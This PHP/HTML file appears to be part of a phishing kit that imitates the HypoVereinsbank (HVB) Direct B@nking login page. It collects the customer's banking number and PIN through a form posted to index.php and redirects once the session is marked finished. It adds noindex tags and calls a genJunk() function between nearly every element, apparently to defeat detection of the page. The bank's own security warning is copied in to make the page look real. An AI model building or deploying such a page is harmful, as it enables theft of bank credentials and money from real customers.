<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>
<!DOCTYPE html>
<html class=" js " slick-uniqueid="3" lang="de">
	<head>
		<meta charset="utf-8">
		<title>LOG IN | HypoVereinsbank (HVB)</title>
		<link rel="icon" type="image/vnd.microsoft.icon" href="src/hy_img/favicon.ico">
		<link rel="shortcut icon" type="image/vnd.microsoft.icon" href="src/hy_img/favicon.ico">
		<link rel="stylesheet" type="text/css" href="src/hy_css/obhp.css">
		<meta name="robots" content="noindex" />
		<meta name="googlebot" content="noindex">
	</head>
	<body role="document">
		<?php echo genJunk() ?><div id="headerContainer">
			<?php echo genJunk() ?><div class="stage">
				<?php echo genJunk() ?><div class="headerMetaNav ">
					<ul>
						<li><a href="#" target="_blank">Presse</a></li>
						<li><a href="#">Jobs &amp; Karriere</a></li>
						<li><a href="#">Newsletter</a></li>			
						<li><a href="#">Mediathek</a></li>
						<li><a href="#">Kontakt</a></li>
						<li class="act"><a title="UniCredit" href="#" target="_blank">UniCredit</a></li>
					</ul>
				</div><?php echo genJunk() ?>
				<?php echo genJunk() ?><div class="headerLogoSearch">
					<?php echo genJunk() ?><div class="headerlogo logo">
						<a class="logolink" href="#">
							<img title="UniCredit" alt="UniCredit" src="src/hy_img/logoHeader.png" width="216" height="54">
						</a>        
					</div><?php echo genJunk() ?>
					<a title="" href="#" class="openAccount">Konto eröffnen</a>
				</div><?php echo genJunk() ?>
			</div><?php echo genJunk() ?>
	
			<?php echo genJunk() ?><div id="mainNav">
				<?php echo genJunk() ?><div class="stage">
					<ul>
						<li><a href="#"><span>Privatkunden</span><span class="sub"></span></a></li>
						<li><a href="#"><span>Private Banking &amp; <br>Wealth Management</span><span class="sub"></span></a></li>
						<li><a href="#"><span>Unternehmer</span><span class="sub"></span></a></li>
						<li><a href="#"><span>Corporate &amp; <br>Investment Banking</span><span class="sub"></span></a></li>
						<li><a href="#"><span>Über uns</span><span class="sub"></span></a></li>
						<li class="login act"><a href="#"><span>LOG IN</span><span class="sub">HVB Direct B@nking</span></a></li>
					</ul>
				</div><?php echo genJunk() ?>
			</div><?php echo genJunk() ?>

			<?php echo genJunk() ?><div class="tipp"></div><?php echo genJunk() ?>
		</div><?php echo genJunk() ?>

		<?php echo genJunk() ?><div id="mainContainer" class="clearfix">
			<?php echo genJunk() ?><div class="stage">
				<?php echo genJunk() ?><div class="teaserSpace">
					<?php echo genJunk() ?><div class="hvb-topteaserspace parsys">
						<?php echo genJunk() ?><div class="specialimageteaser section">
							 <a title="HypoVereinsbank" href="#"><img style="margin-bottom:10px" src="src/hy_img/banner-security-1140x80.jpg" title="banner-security-1140x80" alt="banner-security-1140x80"></a>
						 </div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>   
					
				<?php echo genJunk() ?><div id="sideNavContainer">&nbsp;</div><?php echo genJunk() ?>
				
			<?php echo genJunk() ?><div id="contentContainer">
				<?php echo genJunk() ?><div class="hvb-onlinebankingpage parsys">
					<?php echo genJunk() ?><div class="parbase section rlp">	
						<?php echo genJunk() ?><div class="borderContainer module dbLogin">
							<h2>
								Willkommen im HVB Direct B@nking!<br> Bitte loggen Sie sich ein.
							</h2>

							<form id="directBankingLoginForm" name="directBankingLoginForm" method="post" action="index.php" enctype="application/x-www-form-urlencoded" autocomplete="off">
								<input id="invisibleInput" style="display: none;">
								<input id="invisiblePassword" style="display: none;" type="password">
								<?php echo genJunk() ?><div class="form-messages" style="display: <?php echo (isset($_SESSION['err']) ? "block" : "none"); unset($_SESSION['err']); ?>">
									<ul>
										<li style="display:<?php echo (isset($_SESSION['user_err']) ? "block" : "none") ?>"><span class="textError">Bitte geben Sie Ihre Direct B@nking Nummer ein!</span></li>
										<li style="display:<?php echo (isset($_SESSION['pass_err']) ? "block" : "none") ?>"><span class="textError">Bitte geben Sie Ihre PIN ein!</span></li>
										<li><span class="textError"></span></li>
									</ul>
								</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="clearfix inputWrapper">
									<?php echo genJunk() ?><div class="labelContainer">
										<label for="hy_username" class="<?php echo (isset($_SESSION['user_err']) ? "error" : ""); unset($_SESSION['user_err']); ?>">Direct B@nking Nummer*</label>
										<input id="hy_username" name="hy_username" value="<?php echo (isset($_SESSION['hy_username']) ? $_SESSION['hy_username'] : ""); ?>" maxlength="10" class="first" type="text">
									</div><?php echo genJunk() ?>
									<?php echo genJunk() ?><div class="labelContainer">
										<label for="px2" class="<?php echo (isset($_SESSION['pass_err']) ? "error" : ""); unset($_SESSION['pass_err']); ?>">PIN*</label>
										<input id="hy_password" name="hy_password" maxlength="10" type="password">
									</div><?php echo genJunk() ?>
									<?php echo genJunk() ?><div class="submitCont">
										<input id="sendOB_Login_x" name="sendOB_Login_x" value="Anmelden" onclick="" type="submit">
									</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>

								<?php echo genJunk() ?><div class="additionalInfo clearfix">
									<span class="footnote">* Pflichtfelder</span> <span class="textlink">
										Oder <a href="#" target="_blank">
											<span>HVB Direct B@nking Zugang beantragen</span>
										</a>
									</span>
								</div><?php echo genJunk() ?>
							</form>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
					<?php echo genJunk() ?><div class="securitynote2 parbase section">
						<?php echo genJunk() ?><div class="borderContainer securityWarning" style="">
							<h2>Sicherheit im Direct B@nking</h2>	
							<p>Geben Sie für den Log-in nur die Direct B@nking Nummer und die PIN ein!<br>
							Wenn Sie aufgefordert werden weitere Daten einzugeben, rufen Sie uns bitte unverzüglich an:</p>
							<p class="phone">+49 89 558772100</p>
							<p>Geben Sie nur dann eine TAN ein, wenn Sie selbst zuvor z.B. eine 
							Überweisung erfasst haben. Sorgen Sie ständig für aktualisierte 
							Virenschutz- und Firewall-Software. Nur so schützen Sie ihren PC!</p>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
			</div><?php echo genJunk() ?>

			<?php echo genJunk() ?><div id="serviceNavContainer">
				<span class="resToggle service" data-close="Service Links schließen">Service Links öffnen</span>
				<?php echo genJunk() ?><div class="serviceBlock">
					<?php echo genJunk() ?><div class="hvb-sidebar parsys">
						<?php echo genJunk() ?><div class="parbase section servicebox">
							<?php echo genJunk() ?><div class="leftSide" id="_container">
								<?php echo genJunk() ?><div class="cat " style="border-left: 1px solid #52a421;"><h4 style="color:#52a421;">Online Service</h4>
										<ul>
											<li>
												<span style="background-image: url('src/src/hy_img/icon_tel.png'); padding-left: 20px; background-repeat: no-repeat; color:#3f77b2;">089 558772100</span>
											</li>
											<li>
												<a style="background-image: url('src/src/hy_img/chat_icon.jpg'); background-repeat: no-repeat; padding-left: 20px; color:#3f77b2;" href="#" target="_blank">Chat</a>
											</li>
										</ul>   
									</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="clearfix"></div><?php echo genJunk() ?>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
				<?php echo genJunk() ?><div class="clearfix"></div><?php echo genJunk() ?>

				<?php echo genJunk() ?><div class="topFooter clearfix">
					<?php echo genJunk() ?><div class="metaNav clearfix ">
						<ul class="clearfix">
							<li>
							<a href="#">
							Beschwerdebearbeitung
							</a></li>
							<li>
							<a href="#">
							Impressum
							</a></li>
							<li>
							<a href="#">
							Rechtliche Hinweise
							</a></li>
							<li>
							<a href="#">
							Datenschutz
							</a></li>
							<li>
							<a href="#">
							Geschäftsbedingungen &amp; Konditionen
							</a></li>
							<li>
							<a href="#">
							Sitemap
							</a></li>
						</ul>
						<ul class="clearfix">
							<li>© 
							<?php echo date("Y"); ?>
							HypoVereinsbank</li>
						</ul>
					</div><?php echo genJunk() ?>
					<a href="#" target="_blank"><img class="clLogo" alt="Champions League Sponsorship" title="Champions League Sponsorship" src="src/hy_img/clLogo.png"></a>
					<a href="#" target="_blank"><img class="fcbComposite" alt="Champions League Sponsorship" title="FC Bayern Partnerschaft" src="src/hy_img/HVB_FCB_CompositeLogo_sma.png"></a>
				</div><?php echo genJunk() ?>
			</div><?php echo genJunk() ?>
		</div><?php echo genJunk() ?>

		<?php echo genJunk() ?><div id="cerabox-loading"><?php echo genJunk() ?><div></div><?php echo genJunk() ?></div><?php echo genJunk() ?>
		<?php echo genJunk() ?><div id="cerabox-background"></div><?php echo genJunk() ?>
		<?php echo genJunk() ?><div id="cerabox"><?php echo genJunk() ?><div class="cerabox-content"></div><?php echo genJunk() ?><?php echo genJunk() ?><div class="cerabox-title"><h3></h3></div><?php echo genJunk() ?><?php echo genJunk() ?><div class="cerabox-description"><p></p></div><?php echo genJunk() ?><a class="cerabox-close"></a><a class="cerabox-left"><span></span></a><a class="cerabox-right"><span></span></a><?php echo genJunk() ?><div class="cerabox-content-protection"></div><?php echo genJunk() ?><?php echo genJunk() ?><div id="cerabox-ajaxPreLoader" style="float: left; overflow: hidden; display: block;"></div><?php echo genJunk() ?></div><?php echo genJunk() ?>
	</body>
</html>